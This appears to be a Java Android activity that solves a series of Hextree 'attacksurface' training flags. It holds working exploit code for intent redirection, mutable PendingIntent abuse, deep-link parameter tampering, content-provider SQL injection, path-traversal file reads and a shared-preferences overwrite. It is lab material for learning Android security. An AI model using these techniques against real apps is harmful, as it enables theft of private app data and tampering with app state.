package com.hextree.pocapp;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.Messenger;
import android.os.RemoteException;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;


public class MainHextreeActivity extends AppCompatActivity {

    //Bind to remote service serviceConnection (Flag 26)
    private final ServiceConnection serviceConnectionflag26 = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            Messenger serviceMessenger = new Messenger(service);
            Message msg = Message.obtain(null, 42);
            try {
                serviceMessenger.send(msg);
            } catch (RemoteException e) {
                throw new RuntimeException(e);
            }
        }
        @Override
        public void onServiceDisconnected(ComponentName componentName) {

        }
    };

    //Bind to remote service serviceConnection (Flag 27)
    private final ServiceConnection serviceConnectionflag27a = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            Messenger serviceMessenger = new Messenger(service);
            Message msg = Message.obtain(null, 1);
            Bundle bundle = new Bundle();
            bundle.putString("echo","give flag");
            msg.setData(bundle);
            msg.replyTo = clientMessenger;
            try {
                serviceMessenger.send(msg);
            } catch (RemoteException e) {
                throw new RuntimeException(e);
            }
        }
        @Override
        public void onServiceDisconnected(ComponentName componentName) {

        }
    };
    private final ServiceConnection serviceConnectionflag27b = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            Messenger serviceMessenger = new Messenger(service);
            Message msg = Message.obtain(null, 3);
            Bundle bundle = new Bundle();
            bundle.putString("password","");
            msg.setData(bundle);
            msg.replyTo = clientMessenger;
            try {
                serviceMessenger.send(msg);
            } catch (RemoteException e) {
                throw new RuntimeException(e);
            }
        }
        @Override
        public void onServiceDisconnected(ComponentName componentName) {

        }
    };
    private final Messenger clientMessenger = new Messenger(new IncomingHandler());
    private class IncomingHandler extends Handler {
        IncomingHandler() { super(Looper.getMainLooper());}

        @Override
        public void handleMessage(@NonNull Message msg) {
            Log.i("Message", "Received Response:"+msg);
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);

        //TO DO - Flag 12
        //DeepLink for FLAG13 hex://flag?action=give-me
        //Intent: URI for FLAG15 intent:#Intent;action=io.hextree.action.GIVE_FLAG;category=android.intent.category.BROWSABLE;S.action=flag;B.flag=true;package=io.hextree.attacksurface;end

        //BROADCAST RECEIVER
        //Listen for BroadcastIntent and return (Flag 18)
        BroadcastReceiver receiver = new MaliciousReceiver();
        registerReceiver(receiver, new IntentFilter("io.hextree.broadcast.FREE_FLAG"), RECEIVER_EXPORTED);

        //ACTIVITY INTENT LISTENERS
        Intent intent = getIntent();
        //Listen for [StartActivityForResult() calls and return (Flag 10,11,12)]
        if (intent.getAction() == "io.hextree.attacksurface.ATTACK_ME") {
            Intent returnIntent = new Intent();
            returnIntent.putExtra("token", 1094795585);
            returnIntent.putExtra("LOGIN", true);
            setResult(-1, returnIntent);
        }
        //Listen for [PendingMutableIntent (Flag 23)]
        else if (intent.getAction() == "io.hextree.attacksurface.MUTATE_ME") {
            PendingIntent pendingIntent = (PendingIntent) intent.getParcelableExtra("pending_intent");
            Intent mutableIntent = new Intent();
            mutableIntent.putExtra("code", 42);
            try {
                pendingIntent.send(this, 0, mutableIntent);
            } catch (PendingIntent.CanceledException e) {
                throw new RuntimeException(e);
            }
        }
        //Listen for [DeepLink Intent (Flag 14)]
        else if (intent.getAction() == "android.intent.action.VIEW") {
            Uri data = intent.getData();
            String queryParameter = data.getQueryParameter("type");
            String queryParameter2 = data.getQueryParameter("authToken");
            String queryParameter3 = data.getQueryParameter("authChallenge");
            Intent modIntent = new Intent();
            modIntent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag14Activity");
            modIntent.setAction("android.intent.action.VIEW");
            modIntent.setData(Uri.parse("https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-app-auth?authChallenge=" + queryParameter3 + "&authToken=" + queryParameter2 + "&type=admin"));
            startActivity(modIntent);
        }
        else {
            Utils.showDialog(this, intent);
        }



        //home_button listener
        Button homebutton = findViewById(R.id.home_button);
        homebutton.setOnClickListener(new View.OnClickListener() {

            public void Flag1launchActivity() {
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag1Activity"));
                startActivity(intent);
            }

            public void Flag2launchActivityWithAction() {
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag2Activity"));
                intent.setAction("io.hextree.action.GIVE_FLAG");
                startActivity(intent);
            }

            public void Flag3launchActivityWithActionAndData() {
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag3Activity"));
                intent.setAction("io.hextree.action.GIVE_FLAG");
                intent.setData(Uri.parse("https://app.hextree.io/map/android"));
                startActivity(intent);
            }

            public void Flag4launchActivity() {
                Intent intent3 = new Intent();
                intent3.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag4Activity"));
                intent3.setAction("GET_FLAG_ACTION");
                startActivity(intent3);
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                        Intent intent2 = new Intent();
                        intent2.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag4Activity"));
                        intent2.setAction("BUILD_ACTION");
                        startActivity(intent2);
                }, 100);
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    Intent intent1 = new Intent();
                    intent1.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag4Activity"));
                    intent1.setAction("PREPARE_ACTION");
                    startActivity(intent1);
                }, 200);
            }

            public void Flag5launchActivityWithMultipleIntent() {
                Intent intent = new Intent();
                Intent nextIntent = new Intent();
                Intent nextnextIntent = new Intent();

                nextnextIntent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity"));

                intent.putExtra("reason", "back");
                nextIntent.putExtra("nextIntent", intent);
                nextIntent.putExtra("return", 42);
                nextnextIntent.putExtra("android.intent.extra.INTENT", nextIntent);

                startActivity(nextnextIntent);
            }

            public void Flag6launchActivityWithIntentNotExported() {
                Intent intent = new Intent();
                Intent nextIntent = new Intent();
                Intent nextnextIntent = new Intent();

                nextnextIntent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity"));
                intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag6Activity"));
                intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);

                intent.putExtra("reason", "next");
                nextIntent.putExtra("nextIntent", intent);
                nextIntent.putExtra("return", 42);
                nextnextIntent.putExtra("android.intent.extra.INTENT", nextIntent);

                startActivity(nextnextIntent);
            }

            public void Flag7launchActivityLifecycleTrick() {
                Intent openIntent = new Intent();
                openIntent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity"));
                openIntent.setAction("OPEN");
                startActivity(openIntent);
                // Use a Handler to introduce a small delay before sending the REOPEN intent
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    Intent reopenIntent = new Intent();
                    reopenIntent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity"));
                    reopenIntent.setAction("REOPEN");
                    reopenIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
                    startActivity(reopenIntent);
                }, 100); // Delay of 100 milliseconds
            }

            public void Flag8launchActivity() {
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag8Activity");
                startActivity(intent);
            }

            public void Flag9launchActivityWithReturnExtra() {
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag9Activity");
                startActivityForResult(intent, 1337);
            }

            public void Flag16sendBroadcast() {
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag16Receiver");
                intent.putExtra("flag", "give-flag-16");
                sendBroadcast(intent);
            }

            public void Flag17sendOrderedBroadcast() {
                Intent serviceintent = new Intent();
                serviceintent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.receivers.Flag17Receiver");
                serviceintent.putExtra("flag", "give-flag-17");
                sendOrderedBroadcast(serviceintent, null, new BroadcastReceiver() {
                    @Override
                    public void onReceive(Context context, Intent intent) {
                        Bundle resultExtras = getResultExtras(false);
                        String flag = resultExtras.getString("flag");
                        Log.i("FlagReceiver", flag);
                    }
                }, null, 0, null, null);
            }

            public void Flag22launchActivitySendPendingIntent() {
                Intent innerIntent = new Intent();
                innerIntent.setClassName(getPackageName(), MainHextreeActivity.class.getCanonicalName());
                PendingIntent pendingIntent = PendingIntent.getActivity(MainHextreeActivity.this,0, innerIntent,PendingIntent.FLAG_MUTABLE);
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag22Activity"));
                intent.putExtra("PENDING", pendingIntent);
                startActivity(intent);
            }

            public void Flag19sendWidgetBroadcast() {
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag19Widget");
                intent.setAction("MALICIOUS_APPWIDGET_UPDATE");
                Bundle bundleExtras = new Bundle();
                bundleExtras.putInt("appWidgetMaxHeight", 1094795585 );
                bundleExtras.putInt("appWidgetMinHeight", 322376503 );
                intent.putExtra("appWidgetOptions", bundleExtras);
                sendBroadcast(intent);
            }

            public void Flag20sendNotificationBroadcast() {
                Intent intent = new Intent();
                intent.setAction("io.hextree.broadcast.GET_FLAG");
                intent.putExtra("give-flag", true);
                //intent.putExtra("value", "Flag20Success");
                sendBroadcast(intent);
            }

            public void Flag24launchService() {
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag24Service");
                intent.setAction("io.hextree.services.START_FLAG24_SERVICE");
                startService(intent);
            }

            public void Flag25launchServiceMutipleActionToRunningService() {
                Intent intent1 = new Intent();
                intent1.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag25Service");
                intent1.setAction("io.hextree.services.UNLOCK1");
                startService(intent1);
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    Intent intent2 = new Intent();
                    intent2.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag25Service");
                    intent2.setAction("io.hextree.services.UNLOCK2");
                    startService(intent2);
                }, 100);
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    Intent intent3 = new Intent();
                    intent3.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag25Service");
                    intent3.setAction("io.hextree.services.UNLOCK3");
                    startService(intent3);
                }, 200);
            }

            public void Flag26BindServiceWithMessage() {
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag26Service");
                bindService(intent, serviceConnectionflag26, Context.BIND_AUTO_CREATE);
            }

            public void Flag27BindServiceWithMessageReplies() {
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag27Service");
                bindService(intent, serviceConnectionflag27a, Context.BIND_AUTO_CREATE);
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    Intent intent2 = new Intent();
                    intent2.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag27Service");
                    bindService(intent2, serviceConnectionflag27b, Context.BIND_AUTO_CREATE);
                }, 1000);
            }

            public void Flag30query() {
                Cursor cursor = getContentResolver().query(Uri.parse("content://io.hextree.flag30/success"), null, null, null, null);
                if (cursor.moveToFirst()) {
                    do {
                        StringBuilder sb = new StringBuilder();
                        for (int i = 0; i < cursor.getColumnCount(); i++) {
                            if (sb.length() > 0) {
                                sb.append(", ");
                            }
                            sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                        }
                        Log.d("DUMP", sb.toString());
                        ((TextView) findViewById(R.id.home_text)).append("\n"+sb.toString());
                    } while (cursor.moveToNext());
                }
            }

            public void Flag31queryWithSpecificURI() {
                Cursor cursor = getContentResolver().query(Uri.parse("content://io.hextree.flag31/flag/31"), null, null, null, null);
                if (cursor.moveToFirst()) {
                    do {
                        StringBuilder sb = new StringBuilder();
                        for (int i = 0; i < cursor.getColumnCount(); i++) {
                            if (sb.length() > 0) {
                                sb.append(", ");
                            }
                            sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                        }
                        Log.d("DUMP", sb.toString());
                        ((TextView) findViewById(R.id.home_text)).append("\n"+sb.toString());
                    } while (cursor.moveToNext());
                }
            }

            public void Flag32queryWithSQLi() {
                Cursor cursor = getContentResolver().query(Uri.parse("content://io.hextree.flag32/flags"), null, "1=2) union select * from Flag--", null, null);
                if (cursor.moveToFirst()) {
                    do {
                        StringBuilder sb = new StringBuilder();
                        for (int i = 0; i < cursor.getColumnCount(); i++) {
                            if (sb.length() > 0) {
                                sb.append(", ");
                            }
                            sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                        }
                        Log.d("DUMP", sb.toString());
                        ((TextView) findViewById(R.id.home_text)).append("\n"+sb.toString());
                    } while (cursor.moveToNext());
                }
            }

            public void Flag33queryWithSQLi() {
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag33Activity1");
                intent.setAction("io.hextree.FLAG33");
                startActivityForResult(intent, 1111);
            }

            public void Flag34FileRead() {
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag34Activity");
                intent.putExtra("filename", "flags/flag34.txt");
                startActivityForResult(intent, 2222);
            }

            public void Flag35RootFileRead() {
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag35Activity");
                intent.putExtra("filename", "../flag35.txt");
                startActivityForResult(intent, 3333);
            }

            public void Flag36FileWrite() {
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag35Activity");
                intent.putExtra("filename", "../shared_prefs/Flag36Preferences.xml");
                startActivityForResult(intent, 4444);
            }

            //trigger flag functions on clicking
            @Override
            public void onClick(View view) {
                Flag36FileWrite();
            }

        });

    }

    // Receive result from activity (Flag 9,33,34,35,36)
    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent intent) {
        //Flag9
        if (requestCode == 1337 &&resultCode == RESULT_OK && intent != null){
            Utils.showDialog(this, intent);
            super.onActivityResult(requestCode, resultCode, intent);
        }
        //Flag33.1
        else if (requestCode == 1111 &&resultCode == RESULT_OK && intent != null) {
            Cursor cursor = getContentResolver().query(intent.getData(), null, null, null, null);
            if (cursor.moveToFirst()) {
                do {
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < cursor.getColumnCount(); i++) {
                        if (sb.length() > 0) {
                            sb.append(", ");
                        }
                        sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                    }
                    Log.d("DUMP", sb.toString());
                    ((TextView) findViewById(R.id.home_text)).append("\n"+sb.toString());
                } while (cursor.moveToNext());
            }
            super.onActivityResult(requestCode, resultCode, intent);
        }
        //Flag34
        else if (requestCode == 2222 &&resultCode == RESULT_CANCELED && intent != null) {
            Log.i("FileURI", "FileURI: "+intent.getData());
            try {
                InputStream inputstream = null;
                inputstream = getContentResolver().openInputStream(intent.getData());
                BufferedReader reader = new BufferedReader(new InputStreamReader(inputstream));
                String line;
                while((line = reader.readLine()) != null) {
                    Log.d("FILE", "[*] "+line);
                }
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
            super.onActivityResult(requestCode, resultCode, intent);
        }
        //Flag35
        else if (requestCode == 3333 &&resultCode == RESULT_CANCELED && intent != null) {
            Log.i("FileURI", "FileURI: "+intent.getData());
            try {
                InputStream inputstream = null;
                inputstream = getContentResolver().openInputStream(intent.getData());
                BufferedReader reader = new BufferedReader(new InputStreamReader(inputstream));
                String line;
                while((line = reader.readLine()) != null) {
                    Log.d("FILE", "[*] "+line);
                }
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
            super.onActivityResult(requestCode, resultCode, intent);
        }
        //Flag36
        else if (requestCode == 4444 &&resultCode == RESULT_CANCELED && intent != null) {
            // Retrieve the intent and URI
            Log.i("FileURI", "FileURI: "+intent.getData());
            Uri fileUri = intent.getData();
            if (fileUri != null) {
                try {
                    // Obtain ContentResolver
                    ContentResolver contentResolver = getContentResolver();
                    // Open the URI with "w" mode to allow overwriting
                    try (OutputStream outputStream = contentResolver.openOutputStream(fileUri, "w");
                         OutputStreamWriter writer = new OutputStreamWriter(outputStream)) {
                        // Write the new content
                        writer.write("<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n" +
                                "<map>\n" +
                                "    <boolean name=\"solved\" value=\"true\" />\n" +
                                "</map>");
                        writer.flush();
                        Log.i("FileOperation", "File overwritten successfully.");
                    }
                } catch (Exception e) {
                    Log.e("FileOperation", "Error overwriting file using ContentResolver: " + e.getMessage(), e);
                }
            } else {
                Log.e("FileOperation", "No URI received in the intent.");
            }
            super.onActivityResult(requestCode, resultCode, intent);
        }
        else {
            TextView homeText = findViewById(R.id.home_text);
            homeText.setText("FAILED!");
            super.onActivityResult(requestCode, resultCode, intent);
        }
    }

}